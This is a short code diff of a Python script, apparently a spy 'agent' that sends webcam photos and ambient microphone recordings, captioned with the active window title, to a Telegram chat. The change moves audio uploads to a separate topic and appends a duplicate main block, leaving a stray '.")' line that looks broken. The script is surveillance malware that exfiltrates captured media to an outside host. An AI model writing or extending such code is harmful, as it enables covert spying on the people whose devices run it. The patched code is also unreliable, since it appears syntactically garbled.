@@ -110,10 +110,10 @@ def send_to_telegram(window_title):
         with open("webcam.jpg", "rb") as f:
             post_data(url_photo, "photo", TOPIC_WEBCAM, f"WEBCAM\n{caption}", {"photo": f})
 
-    # Send Audio to TOPIC_GENERAL
+    # Send Audio to TOPIC_AUDIO
     if os.path.exists("audio.wav"):
         with open("audio.wav", "rb") as f:
-            post_data(url_doc, "document", TOPIC_GENERAL, f"AUDIO (Ambient)\n{caption}", {"document": f})
+            post_data(url_doc, "document", TOPIC_AUDIO, f"AUDIO (Ambient)\n{caption}", {"document": f})
 
 def main():
     if not TOKEN or not CHAT_ID:
@@ -154,6 +154,10 @@ def main():
             
     except KeyboardInterrupt:
         print("Agent stopped by user.")
+
+if __name__ == "__main__":
+    main()
+.")
 
 if __name__ == "__main__":
     main()
